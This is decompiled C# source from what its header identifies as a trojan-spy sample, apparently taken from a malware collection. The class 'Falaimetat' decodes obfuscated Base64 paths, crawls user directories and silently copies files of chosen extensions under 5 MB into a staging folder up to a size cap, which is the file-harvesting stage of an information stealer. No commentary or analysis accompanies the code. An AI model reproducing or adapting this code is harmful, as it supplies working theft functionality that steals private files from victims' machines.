// Decompiled with JetBrains decompiler
// Type: AlphaCentavr.Falaimetat
// Assembly: Xobntom2, Version=1.0.0.422, Culture=neutral, PublicKeyToken=null
// MVID: 7E933326-C6DC-4B1B-B81C-CFA3C6FCABF5
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.04\HEUR-Trojan-Spy.MSIL.Agent.gen-bbc8ac47d3051fbab328d4a8a4c1c8819707ac045ab6ac94b1997dac59be2ece.exe

using System;
using System.Collections.Generic;
using System.IO;
using System.Text;

namespace AlphaCentavr
{
  public class Falaimetat
  {
    public static int count;

    private static string gysihahaha(string kiasaalisa) => Encoding.ASCII.GetString(Convert.FromBase64String(kiasaalisa));

    public static void chetebenadabno()
    {
      try
      {
        string str = glantrah.ekranirovan + Falaimetat.gysihahaha("XFxGaWxlcw==");
        Directory.CreateDirectory(str);
        if (!Directory.Exists(str))
        {
          Falaimetat.chetebenadabno();
        }
        else
        {
          Falaimetat.pisefaganit(glantrah.fwerwr, str, "*.*", (long) velelyifanar.reper);
          Falaimetat.pisefaganit(glantrah.wguerihgiuw, str, "*.*", (long) velelyifanar.reper);
          Falaimetat.pisefaganit(glantrah.rashka + Falaimetat.gysihahaha("XFxzb3VyY2U="), str, "*.*", (long) velelyifanar.reper);
        }
      }
      catch (Exception ex)
      {
      }
    }

    private static long iooppp(string yyyyyyytttttttttttttttt, long size = 0)
    {
      try
      {
        foreach (string enumerateFile in Directory.EnumerateFiles(yyyyyyytttttttttttttttt))
        {
          try
          {
            checked { size += new FileInfo(enumerateFile).Length; }
          }
          catch
          {
          }
        }
        foreach (string enumerateDirectory in Directory.EnumerateDirectories(yyyyyyytttttttttttttttt))
        {
          try
          {
            checked { size += Falaimetat.iooppp(enumerateDirectory); }
          }
          catch
          {
          }
        }
      }
      catch
      {
      }
      return size;
    }

    public static void pisefaganit(
      string sourcddddde,
      string tddddaxrgdet,
      string patddddddddddddddddtern,
      long maxSize)
    {
      Stack<GetFiles.Folders> foldersStack = new Stack<GetFiles.Folders>();
      foldersStack.Push(new GetFiles.Folders(sourcddddde, tddddaxrgdet));
      long num = Falaimetat.iooppp(tddddaxrgdet);
      while (foldersStack.Count > 0)
      {
        GetFiles.Folders folders = foldersStack.Pop();
        try
        {
          Directory.CreateDirectory(folders.Targnnnet);
          foreach (string enumerateFile in Directory.EnumerateFiles(folders.Sxouvbvbrce, patddddddddddddddddtern))
          {
            try
            {
              if (Array.IndexOf<string>(velelyifanar.lubasha, Path.GetExtension(enumerateFile).ToLower()) >= 0)
              {
                string str = Path.Combine(folders.Targnnnet, Path.GetFileName(enumerateFile));
                if (new FileInfo(enumerateFile).Length / 1024L < 5000L)
                {
                  File.Copy(enumerateFile, str);
                  checked { num += new FileInfo(str).Length; }
                  if (num > maxSize)
                    return;
                  checked { ++Falaimetat.count; }
                }
              }
            }
            catch (Exception ex)
            {
            }
          }
        }
        catch (UnauthorizedAccessException ex)
        {
          continue;
        }
        catch (PathTooLongException ex)
        {
          continue;
        }
        try
        {
          foreach (string enumerateDirectory in Directory.EnumerateDirectories(folders.Sxouvbvbrce))
          {
            try
            {
              if (!enumerateDirectory.Contains(Path.Combine(glantrah.fwerwr, Environment.UserName)))
                foldersStack.Push(new GetFiles.Folders(enumerateDirectory, Path.Combine(folders.Targnnnet, Path.GetFileName(enumerateDirectory))));
            }
            catch (Exception ex)
            {
            }
          }
        }
        catch (UnauthorizedAccessException ex)
        {
        }
        catch (DirectoryNotFoundException ex)
        {
        }
        catch (PathTooLongException ex)
        {
        }
      }
      foldersStack.Clear();
    }
  }
}
